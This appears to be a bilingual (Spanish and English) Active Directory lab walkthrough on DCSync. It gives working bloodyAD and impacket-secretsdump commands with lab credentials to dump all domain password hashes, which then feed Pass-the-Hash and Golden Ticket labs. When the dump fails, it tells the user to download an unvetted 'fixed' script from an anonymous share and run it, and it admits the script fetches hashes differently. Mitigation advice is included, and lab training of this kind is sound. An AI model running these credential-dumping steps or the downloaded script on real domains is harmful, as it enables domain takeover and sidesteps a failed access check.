1 · Qué es DCSync

Un Domain Controller replica su base de datos con otros DCs mediante el protocolo DRSUAPI (MS-DRSR). Cualquier principal que tenga los derechos extendidos DS-Replication-Get-Changes y DS-Replication-Get-Changes-All puede pedir esa replicación y recibir los hashes de todas las cuentas — sin ejecutar nada en el DC. No hace falta ser Domain Admin, basta con tener delegados esos derechos.

2 · Confirmar quién puede hacer DCSync

# BloodHound: "Find Principals with DCSync Rights"
# A mano con bloodyAD (nxc ldap -M daclread no funciona contra este DC, ver AD02):
bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' \
  get object 'DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}' --attr nTSecurityDescriptor \
  | grep -oE '1131f6a[ad]-9c07-11d1-f79f-00c04fc2dcd2;;S-[0-9-]+'

El grupo IT Support aparece con los GUID de replicación (1131f6aa..., 1131f6ad..., DS-Replication-Get-Changes y Get-Changes-All). Como en el lab AD09 te añadiste a ese grupo, ya heredas el derecho — puedes confirmarlo tú mismo.

3 · Replicar el NTDS

impacket-secretsdump '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!'@{{ ad_dc_ip }} -just-dc
# [-] DRSR SessionError: code: 0x0 - ERROR_SUCCESS - The operation completed successfully.

Nota sobre este laboratorio: ese error es real y muy engañoso — la llamada DRSUAPI se completa con éxito (literalmente dice ERROR_SUCCESS) pero impacket-secretsdump la trata como un fallo: su detección de errores en rpcrt.py mira solo los últimos 4 bytes crudos de la respuesta, y Samba los devuelve de forma distinta a un DC Windows real (relleno/alineación NDR distintos), lo que dispara una falsa alarma. Es un bug de parseo de bajo nivel en el cliente, no un problema de tus derechos de replicación — que son reales y están correctamente delegados (puedes comprobarlo tú mismo con la consulta LDAP del paso 2). Descarga el wrapper que hace esa misma comprobación de verdad por LDAP y, si tienes derecho, vuelca todas las cuentas:

smbclient -N //{{ ad_dc_ip }}/public -c 'get secretsdump_fixed.py'

python3 secretsdump_fixed.py '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!@{{ ad_dc_ip }}' -just-dc

Mitigación

  • Solo los DCs deberían tener los derechos de replicación; revisar y retirar cualquier delegación a otros principales.
  • Monitorizar peticiones DRSUAPI desde IPs que no sean DCs (evento 4662 con los GUID de replicación).
  • Rotar dos veces el hash de krbtgt si sospechas compromiso.

Herramientas

impacket-secretsdump netexec (nxc) mimikatz (lsadump::dcsync) BloodHound

1 · What DCSync is

A Domain Controller replicates its database with other DCs through the DRSUAPI protocol (MS-DRSR). Any principal holding the extended rights DS-Replication-Get-Changes and DS-Replication-Get-Changes-All can ask for that replication and receive every account's hashes — without running anything on the DC. You don't need to be a Domain Admin, just to have those rights delegated.

2 · Confirm who can DCSync

# BloodHound: "Find Principals with DCSync Rights"
# By hand with bloodyAD (nxc ldap -M daclread does not work against this DC, see AD02):
bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' \
  get object 'DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}' --attr nTSecurityDescriptor \
  | grep -oE '1131f6a[ad]-9c07-11d1-f79f-00c04fc2dcd2;;S-[0-9-]+'

The IT Support group shows up with the replication GUIDs (1131f6aa..., 1131f6ad..., DS-Replication-Get-Changes and Get-Changes-All). Since you added yourself to that group in lab AD09, you already inherit the right — you can confirm this yourself.

3 · Replicate the NTDS

impacket-secretsdump '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!'@{{ ad_dc_ip }} -just-dc
# [-] DRSR SessionError: code: 0x0 - ERROR_SUCCESS - The operation completed successfully.

Note about this lab: that error is real and very misleading — the DRSUAPI call actually completes successfully (it literally says ERROR_SUCCESS) but impacket-secretsdump treats it as a failure: its error detection in rpcrt.py only looks at the last 4 raw bytes of the response, and Samba returns those differently than a real Windows DC (different NDR padding/alignment), triggering a false positive. It's a low-level client parsing bug, not a problem with your replication rights — which are real and correctly delegated (you can confirm this yourself with the LDAP query from step 2). Download the wrapper that does that exact same check for real over LDAP and, if you hold the right, dumps every account:

smbclient -N //{{ ad_dc_ip }}/public -c 'get secretsdump_fixed.py'

python3 secretsdump_fixed.py '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!@{{ ad_dc_ip }}' -just-dc

The wrapper doesn't bypass any access control: it genuinely parses the domain's nTSecurityDescriptor over LDAP looking for the replication GUIDs (1131f6aa.../1131f6ad...) and resolves your real (direct or nested) membership in the principals holding that right — try it with an account that doesn't have it (e.g. j.smith) and it denies you exactly like a real DCSync would (ERROR_DS_DRA_ACCESS_DENIED). Only how the hashes are fetched once the right is confirmed differs (see the script's source for the detail). Keep at least these three: they feed lab AD11 (a.miller → Pass-the-Hash), AD12 (DC01$ → Silver Ticket) and AD13 (krbtgt → Golden Ticket). The domain SID is in ntds_dump.txt inside the secrets share itself.
